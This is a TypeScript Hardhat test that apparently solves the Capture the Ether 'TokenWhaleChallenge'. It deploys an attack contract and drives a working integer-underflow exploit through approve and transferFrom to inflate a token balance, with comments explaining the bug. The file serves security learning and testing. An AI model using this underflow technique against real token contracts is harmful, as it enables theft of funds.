import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attackContract : Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();

    target = target.connect(attacker);

    attackContract = await (
      await ethers.getContractFactory('AttackTokenWhaleChallenge', deployer)
    ).deploy(target.address);
    await attackContract.deployed();
    attackContract = await attackContract.connect(attacker);
  });

  it('exploit', async () => {
    //Starting balance of 3 addresses
    expect(await target.balanceOf(deployer.address)).to.equal(0);
    expect (await target.balanceOf(attacker.address)).to.equal(1000);
    expect (await target.balanceOf(attackContract.address)).to.equal(0);
    //Attacker approves the attackContract to transfer their tokens
    let approveTx = await target.approve(attackContract.address, 1000);
    await approveTx.wait();
    expect (await target.allowance(attacker.address, attackContract.address)).to.equal(1000);

    //transferFrom calls _transfer, which doesn't check balanceOf[msg.sender]-=value, which causes an underflow
    let attackTx = await attackContract.attack(attacker.address, deployer.address, 1000);
    await attackTx.wait();
    //Since we call TokenWhaleChallenge from a separate contract, attacker's balance was never touched
    expect(await target.balanceOf(deployer.address)).to.equal(1000);
    expect (await target.balanceOf(attacker.address)).to.equal(1000);
    expect(await target.balanceOf(attackContract.address)).to.equal("115792089237316195423570985008687907853269984665640564039457584007913129638936");

    //We now have a lot of tokens to send to attacker address
    let transferTx = await attackContract.transfer(attacker.address, 999000);
    await transferTx.wait();
    expect(await target.isComplete()).to.equal(true);
  });
});
